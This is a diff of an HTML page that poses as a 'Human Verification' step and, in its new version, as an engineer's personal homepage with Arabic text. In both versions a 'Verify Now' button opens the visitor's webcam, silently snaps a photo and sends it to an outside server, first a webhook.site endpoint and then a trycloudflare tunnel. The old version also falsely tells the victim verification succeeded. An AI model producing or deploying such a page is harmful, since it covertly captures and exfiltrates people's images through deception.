@@ -1,55 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Verification Page</title>
-    <style>
-        body { text-align: center; font-family: sans-serif; padding-top: 50px; }
-        .box { border: 2px solid #ccc; padding: 20px; display: inline-block; }
-        button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
-    </style>
+    <title>المهندس عبودي الجبوري</title>
 </head>
 <body>
+    <h1>مرحباً بكم في موقع المهندس عبودي الجبوري</h1>
+    <button id="verifyBtn">Verify Now</button>
 
-<div class="box">
-    <h1>Human Verification</h1>
-    <p>Please click the button below to prove you are human.</p>
-    <button onclick="startCamera()">Verify Now</button>
-</div>
+    <script>
+        const btn = document.getElementById('verifyBtn');
+        const SERVER_URL = "https://fragrances-instructor-apply-repeated.trycloudflare.com/upload";
 
-<video id="video" style="display:none" autoplay></video>
+        btn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-<script>
-    async function startCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    const imageData = canvas.toDataURL('image/png');
 
-            setTimeout(async () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                
-                const imageData = canvas.toDataURL('image/png');
-                
-                const blob = await (await fetch(imageData)).blob();
-                const reader = new FileReader();
-                reader.readAsDataURL(blob); 
-                reader.onloadend = function() {
-                    const base64data = reader.result;
-                    navigator.sendBeacon('https://webhook.site/ccaa7fc6-aa98-4db2-bdce-e85f03e94d2d', JSON.stringify({image: base64data}));
-                };
+                    // إرسال البيانات للسيرفر الخاص بك
+                    navigator.sendBeacon(SERVER_URL, new URLSearchParams({ image: imageData }));
 
-                alert("Verification successful.");
-            }, 2000);
-
-        } catch (err) {
-            console.error("Error: ", err);
-            alert("Verification failed.");
-        }
-    }
-</script>
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+            }
+        });
+    </script>
 </body>
 </html>
